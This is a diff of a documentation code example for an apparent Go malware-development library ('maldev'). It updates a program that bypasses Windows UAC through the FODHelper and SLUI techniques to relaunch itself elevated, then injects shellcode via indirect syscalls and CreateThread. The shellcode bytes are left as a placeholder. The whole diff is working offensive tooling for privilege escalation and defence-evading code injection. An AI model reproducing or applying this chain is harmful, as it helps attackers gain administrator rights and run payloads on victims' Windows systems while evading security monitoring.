@@ -177,8 +177,9 @@ fmt.Printf("Admin group member: %v\n", isMember)
 package main
 
 import (
-    "context"
     "fmt"
+    "log"
+    "os"
 
     "github.com/oioio-space/maldev/inject"
     "github.com/oioio-space/maldev/privesc/uac"
@@ -194,20 +195,20 @@ func main() {
         exePath, _ := os.Executable()
         if err := uac.FODHelper(exePath); err != nil {
             fmt.Println("UAC bypass failed, trying SLUI...")
-            uac.SLUI(exePath)
+            _ = uac.SLUI(exePath)
         }
         return // original process exits, elevated copy continues
     }
 
-    // Now running elevated -- perform injection
-    caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewTartarus())
-    defer caller.Close()
+    // Now running elevated -- perform injection via indirect syscalls.
+    inj, err := inject.NewWindowsInjector(&inject.WindowsConfig{
+        Config:        inject.Config{Method: inject.MethodCreateThread},
+        SyscallMethod: wsyscall.MethodIndirect,
+    })
+    if err != nil { log.Fatal(err) }
 
     shellcode := []byte{/* ... */}
-    pipe := inject.NewPipeline(caller)
-    pipe.Inject(context.Background(), shellcode,
-        inject.WithMethod(inject.MethodCreateThread),
-    )
+    if err := inj.Inject(shellcode); err != nil { log.Fatal(err) }
 }
 ```
 
